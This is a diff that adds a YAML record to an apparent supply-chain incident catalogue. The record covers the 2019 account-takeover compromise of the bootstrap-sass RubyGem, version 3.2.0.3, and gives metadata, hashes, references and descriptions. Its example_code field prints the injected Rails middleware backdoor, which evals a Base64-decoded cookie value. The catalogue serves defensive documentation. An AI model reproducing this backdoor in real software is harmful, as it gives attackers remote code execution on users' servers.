@@ -1,0 +1,59 @@
+- name: bootstrap-sass
+  title: bootstrap-sass RubyGem compromised via maintainer account.
+  start_date: 2019-03-26
+  end_date: 2019-03-26
+  license: MIT
+  website: https://github.com/twbs/bootstrap-sass
+  repo: https://github.com/twbs/bootstrap-sass
+  attribution_type: unknown
+  attribution: Attacker via maintainer's RubyGems account
+  component_type: Library
+  lang: Ruby
+  cause: compromise
+  motive: Remote Code Execution, Backdoor
+  attack_vector: Account takeover
+  transitive: false
+  insertion_phase: distribution
+  impact_type: Remote Code Execution, Backdoor
+  impact_user_count: 1469
+  references:
+    - https://github.com/twbs/bootstrap-sass/issues/1195
+    - https://www.ironin.it/blog/malicious-backdoor-code-found-in-the-bootstrap-sass-ruby-gem.html
+    - https://rubygems.org/gems/bootstrap-sass/versions/3.2.0.3
+  versions:
+    - 3.2.0.3
+  artifacts:
+    - https://rubygems.org/gems/bootstrap-sass/versions/3.2.0.3
+  impacted_hashes:
+    - 366d6162fe36fc81dadc114558b43c6c8890c8bcc7e90e2949ae6344d0785dc0
+  synopsis: |
+    Attacker compromised a maintainer's RubyGems account and published version 3.2.0.3. This version contained a backdoor enabling RCE via a crafted cookie in Rails applications.
+  compromise_desc: |
+    An attacker gained unauthorized access to a maintainer's RubyGems account, likely due to a weak password. The attacker then yanked the legitimate 3.2.0.2 version and pushed the malicious 3.2.0.3 version. The legitimate GitHub repository was unaffected.
+  impact_desc: |
+    The malicious code injected into the gem would activate in Rails production environments. It checked for a specific cookie (`__cfduid`). If present, the cookie's value was Base64 decoded and executed as Ruby code using `eval`, granting the attacker remote code execution capabilities.
+  example_code: |
+    ```ruby
+    # Malicious middleware injected into lib/bootstrap-sass/engine.rb
+    initializer 'bootstrap-sass.middleware' do |app|
+      if ::Rails.env.production?
+        # ... other middleware setup ...
+        app.middleware.insert_before ::Rack::Sendfile, Class.new {
+          def initialize(app)
+            @app = app
+          end
+
+          def call(env)
+            # Check for the trigger cookie
+            if ::Rack::Request.new(env).cookies["__cfduid"]
+              # Decode and execute the cookie value as Ruby code
+              eval(::Base64.decode64(::Rack::Request.new(env).cookies["__cfduid"]))
+            end
+            @app.call(env)
+          rescue => err # Handle error
+            @app.call(env)
+          end
+        }
+      end
+    end
+    ```
